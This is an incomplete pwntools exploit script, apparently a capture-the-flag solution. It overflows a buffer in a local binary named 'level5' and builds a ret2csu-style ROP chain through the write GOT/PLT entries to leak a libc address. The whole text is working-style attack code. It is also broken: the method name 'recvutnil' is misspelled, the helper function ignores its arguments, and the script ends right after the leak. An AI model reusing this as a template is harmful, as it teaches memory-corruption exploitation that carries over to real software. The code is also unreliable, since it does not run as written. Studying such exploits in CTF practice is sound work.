#!/usr/bin/env python 
# -*- coding: UTF-8 -*-
from pwn import *

p=process('./level5')
elf=ELF('./level5')

start = 0x400460
_cus_start=0x400606
_cus_end=0x4005f0
write_got=elf.got['write']
write_plt=elf.symbols['write']
read_plt=elf.symbols['read']

junk='a'*(0x80+8)

def cus(rbp,rbx,rdi,rsi,rdx):
	'''
	rbp=0 ,rbx=1

	'''
	payload=junk+p64(_cus_start)+p64(0)+p64(1)+p64(1)+p64(write_got)+p64(1)+p64(write_plt)
	p.recvutnil("Hello,World\n")
	p.sendline(payload)
	leak=u64(p.recv(8))



